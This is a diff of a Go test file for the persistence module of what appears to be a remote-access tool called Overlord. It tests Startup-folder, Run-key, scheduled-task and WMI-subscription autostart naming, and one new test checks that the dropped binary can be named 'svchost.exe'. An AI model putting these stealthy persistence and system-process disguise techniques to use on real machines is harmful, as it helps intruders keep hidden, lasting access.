@@ -26,7 +26,7 @@ func TestGetTargetPath_UsesStartupFolderAndRandomizedOvdName(t *testing.T) {
 		t.Fatalf("expected dir %q, got %q", wantDir, filepath.Dir(got))
 	}
 	base := strings.ToLower(filepath.Base(got))
-	if !strings.HasPrefix(base, startupExecutablePrefix) || !strings.HasSuffix(base, ".exe") {
+	if !strings.HasPrefix(base, executablePrefix()) || !strings.HasSuffix(base, ".exe") {
 		t.Fatalf("expected randomized ovd_*.exe name, got %q", filepath.Base(got))
 	}
 }
@@ -124,7 +124,7 @@ func TestGetTargetPath_NonStartupMethodsUseAppDataBinaryDir(t *testing.T) {
 				t.Fatalf("method=%q: expected dir %q, got %q", method, wantDir, filepath.Dir(got))
 			}
 			base := strings.ToLower(filepath.Base(got))
-			if !strings.HasPrefix(base, startupExecutablePrefix) || !strings.HasSuffix(base, ".exe") {
+			if !strings.HasPrefix(base, executablePrefix()) || !strings.HasSuffix(base, ".exe") {
 				t.Fatalf("method=%q: expected ovd_*.exe name, got %q", method, filepath.Base(got))
 			}
 		})
@@ -171,8 +171,8 @@ func TestDeriveTaskName_DeterministicAndPrefixed(t *testing.T) {
 	if got1 != got2 {
 		t.Fatalf("deriveTaskName is not deterministic: %q vs %q", got1, got2)
 	}
-	if !strings.HasPrefix(got1, taskNamePrefix) {
-		t.Fatalf("task name %q does not have prefix %q", got1, taskNamePrefix)
+	if !strings.HasPrefix(got1, executablePrefix()) {
+		t.Fatalf("task name %q does not have prefix %q", got1, executablePrefix())
 	}
 }
 
@@ -199,11 +199,11 @@ func TestDeriveWMINames_DeterministicPrefixedAndDistinct(t *testing.T) {
 	if f1 != f2 || c1 != c2 {
 		t.Fatalf("deriveWMINames not deterministic: filter %q!=%q or consumer %q!=%q", f1, f2, c1, c2)
 	}
-	if !strings.HasPrefix(f1, taskNamePrefix) {
-		t.Fatalf("filter name %q missing prefix %q", f1, taskNamePrefix)
+	if !strings.HasPrefix(f1, executablePrefix()) {
+		t.Fatalf("filter name %q missing prefix %q", f1, executablePrefix())
 	}
-	if !strings.HasPrefix(c1, taskNamePrefix) {
-		t.Fatalf("consumer name %q missing prefix %q", c1, taskNamePrefix)
+	if !strings.HasPrefix(c1, executablePrefix()) {
+		t.Fatalf("consumer name %q missing prefix %q", c1, executablePrefix())
 	}
 	if f1 == c1 {
 		t.Fatalf("filter and consumer names must differ, both are %q", f1)
@@ -226,8 +226,8 @@ func TestGenerateBinaryName_FormatAndUniqueness(t *testing.T) {
 			t.Fatalf("generateBinaryName() error: %v", err)
 		}
 		lower := strings.ToLower(name)
-		if !strings.HasPrefix(lower, startupExecutablePrefix) {
-			t.Fatalf("name %q missing prefix %q", name, startupExecutablePrefix)
+		if !strings.HasPrefix(lower, executablePrefix()) {
+			t.Fatalf("name %q missing prefix %q", name, executablePrefix())
 		}
 		if !strings.HasSuffix(lower, ".exe") {
 			t.Fatalf("name %q missing .exe suffix", name)
@@ -311,7 +311,7 @@ func TestCleanupPrefixedExecutables_RemovesOvdFiles(t *testing.T) {
 
 	entries, _ := os.ReadDir(dir)
 	for _, e := range entries {
-		if strings.HasPrefix(strings.ToLower(e.Name()), startupExecutablePrefix) {
+		if strings.HasPrefix(strings.ToLower(e.Name()), executablePrefix()) {
 			t.Fatalf("ovd_* file %q was not removed", e.Name())
 		}
 	}
@@ -323,76 +323,6 @@ func TestCleanupPrefixedExecutables_RemovesOvdFiles(t *testing.T) {
 func TestCleanupPrefixedExecutables_NonexistentDirReturnsNil(t *testing.T) {
 	if err := cleanupPrefixedExecutables(filepath.Join(t.TempDir(), "nonexistent")); err != nil {
 		t.Fatalf("expected nil for nonexistent dir, got %v", err)
-	}
-}
-
-func TestInstallRegistry_WritesQuotedValue(t *testing.T) {
-	dummy := `C:\Testing\ovd_testvalue.exe`
-	if err := installRegistry(dummy); err != nil {
-		t.Fatalf("installRegistry: %v", err)
-	}
-
-	k, err := registry.OpenKey(registry.CURRENT_USER, registryKey,
-		registry.QUERY_VALUE|registry.SET_VALUE)
-	if err != nil {
-		t.Fatalf("open registry key: %v", err)
-	}
-	defer k.Close()
-
-	names, _ := k.ReadValueNames(0)
-	var found string
-	for _, name := range names {
-		if strings.HasPrefix(strings.ToLower(name), strings.ToLower(registryValuePrefix)) {
-			val, _, _ := k.GetStringValue(name)
-			if strings.Contains(val, "ovd_testvalue.exe") {
-				found = name
-				break
-			}
-		}
-	}
-	if found == "" {
-		t.Fatal("installRegistry did not write expected Run key value")
-	}
-	val, _, _ := k.GetStringValue(found)
-	if !strings.HasPrefix(val, `"`) || !strings.HasSuffix(val, `"`) {
-		t.Fatalf("expected quoted value like \"...\", got %q", val)
-	}
-	_ = k.DeleteValue(found)
-}
-
-func TestInstallRegistry_UpdatesExistingValue(t *testing.T) {
-	first := `C:\Testing\ovd_first.exe`
-	second := `C:\Testing\ovd_second.exe`
-
-	if err := installRegistry(first); err != nil {
-		t.Fatalf("installRegistry(first): %v", err)
-	}
-	if err := installRegistry(second); err != nil {
-		t.Fatalf("installRegistry(second): %v", err)
-	}
-
-	k, err := registry.OpenKey(registry.CURRENT_USER, registryKey,
-		registry.QUERY_VALUE|registry.SET_VALUE)
-	if err != nil {
-		t.Fatalf("open registry key: %v", err)
-	}
-	defer k.Close()
-
-	names, _ := k.ReadValueNames(0)
-	var matches []string
-	for _, name := range names {
-		if strings.HasPrefix(strings.ToLower(name), strings.ToLower(registryValuePrefix)) {
-			val, _, _ := k.GetStringValue(name)
-			if strings.Contains(val, "ovd_first.exe") || strings.Contains(val, "ovd_second.exe") {
-				matches = append(matches, name)
-			}
-		}
-	}
-	for _, name := range matches {
-		_ = k.DeleteValue(name)
-	}
-	if len(matches) != 1 {
-		t.Fatalf("expected exactly 1 Run value for the two installs, got %d", len(matches))
 	}
 }
 
@@ -432,5 +362,110 @@ func TestCleanupOverlordRunValues_RemovesMatchingValues(t *testing.T) {
 	}
 	if _, _, err := k.GetStringValue(keepName); err != nil {
 		t.Fatalf("expected %q to remain, got error: %v", keepName, err)
+	}
+}
+
+func TestGenerateBinaryName_CustomName_NoRandomSuffix(t *testing.T) {
+	orig := DefaultStartupName
+	t.Cleanup(func() { DefaultStartupName = orig })
+	DefaultStartupName = "svchost"
+
+	name, err := generateBinaryName()
+	if err != nil {
+		t.Fatalf("generateBinaryName() error: %v", err)
+	}
+	if name != "svchost.exe" {
+		t.Fatalf("expected %q, got %q", "svchost.exe", name)
+	}
+}
+
+func TestGenerateBinaryName_DefaultName_HasRandomSuffix(t *testing.T) {
+	orig := DefaultStartupName
+	t.Cleanup(func() { DefaultStartupName = orig })
+	DefaultStartupName = ""
+
+	name, err := generateBinaryName()
+	if err != nil {
+		t.Fatalf("generateBinaryName() error: %v", err)
+	}
+	if !strings.HasPrefix(name, "ovd_") || !strings.HasSuffix(name, ".exe") || name == "ovd_.exe" {
+		t.Fatalf("expected ovd_<hex>.exe, got %q", name)
+	}
+}
+
+func TestFindExistingBinaryInDir_CustomName(t *testing.T) {
+	orig := DefaultStartupName
+	t.Cleanup(func() { DefaultStartupName = orig })
+	DefaultStartupName = "myapp"
+
+	dir := t.TempDir()
+	expected := filepath.Join(dir, "myapp.exe")
+	if err := os.WriteFile(expected, []byte("x"), 0644); err != nil {
+		t.Fatalf("write: %v", err)
+	}
+	// Also write an ovd_ file that should NOT be matched
+	if err := os.WriteFile(filepath.Join(dir, "ovd_aabbcc.exe"), []byte("x"), 0644); err != nil {
+		t.Fatalf("write: %v", err)
+	}
+
+	got, ok := findExistingBinaryInDir(dir)
+	if !ok {
+		t.Fatal("expected true, got false")
+	}
+	if !strings.EqualFold(filepath.Clean(got), filepath.Clean(expected)) {
+		t.Fatalf("expected %q, got %q", expected, got)
+	}
+}
+
+func TestCleanupPrefixedExecutables_CustomName(t *testing.T) {
+	orig := DefaultStartupName
+	t.Cleanup(func() { DefaultStartupName = orig })
+	DefaultStartupName = "myapp"
+
+	dir := t.TempDir()
+	if err := os.WriteFile(filepath.Join(dir, "myapp.exe"), []byte("x"), 0644); err != nil {
+		t.Fatalf("write: %v", err)
+	}
+	// These should NOT be removed with the custom name set
+	keepers := []string{"ovd_aabbcc.exe", "other.exe"}
+	for _, name := range keepers {
+		if err := os.WriteFile(filepath.Join(dir, name), []byte("x"), 0644); err != nil {
+			t.Fatalf("write %q: %v", name, err)
+		}
+	}
+
+	if err := cleanupPrefixedExecutables(dir); err != nil {
+		t.Fatalf("cleanupPrefixedExecutables: %v", err)
+	}
+
+	entries, _ := os.ReadDir(dir)
+	for _, e := range entries {
+		if strings.EqualFold(e.Name(), "myapp.exe") {
+			t.Fatalf("custom-named file %q was not removed", e.Name())
+		}
+	}
+	if got := len(entries); got != len(keepers) {
+		t.Fatalf("expected %d files remaining, got %d", len(keepers), got)
+	}
+}
+
+func TestGetTargetPath_CustomName(t *testing.T) {
+	origMethod := DefaultPersistenceMethod
+	origName := DefaultStartupName
+	t.Cleanup(func() {
+		DefaultPersistenceMethod = origMethod
+		DefaultStartupName = origName
+	})
+	DefaultStartupName = "updater"
+
+	appData := t.TempDir()
+	t.Setenv("APPDATA", appData)
+
+	got, err := getTargetPath()
+	if err != nil {
+		t.Fatalf("getTargetPath failed: %v", err)
+	}
+	if filepath.Base(got) != "updater.exe" {
+		t.Fatalf("expected updater.exe, got %q", filepath.Base(got))
 	}
 }
